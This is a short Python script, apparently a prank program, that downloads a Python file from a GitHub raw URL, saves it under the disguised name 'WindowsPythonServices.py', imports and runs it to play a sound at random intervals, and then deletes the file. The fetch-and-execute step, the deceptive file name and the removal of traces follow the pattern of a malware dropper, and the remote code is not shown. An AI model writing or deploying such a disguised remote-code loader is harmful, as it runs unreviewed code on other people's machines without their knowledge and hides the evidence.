import requests, os, time, random

# downloads raw git file as text
file_text = requests.get("https://raw.githubusercontent.com/GummyC/PrankProgram/refs/heads/main/main.py").text

# converts into python file with a hidden name
with open ("WindowsPythonServices.py", "w") as f:
    f.write(file_text)
    

# min and max wait time (secconds)
min_wait = 1200
max_wait = 28800

# loads main file
import WindowsPythonServices

# plays sound max three times at random intervals
for i in range(3):
    time.sleep(random.randint(1,5)) #for testing

    # time.sleep(random.randint(min_wait,max_wait))

    player = WindowsPythonServices.playSound()
    player.Play()

# TODO: need to add check for files existence prior to write
os.remove("WindowsPythonServices.py")



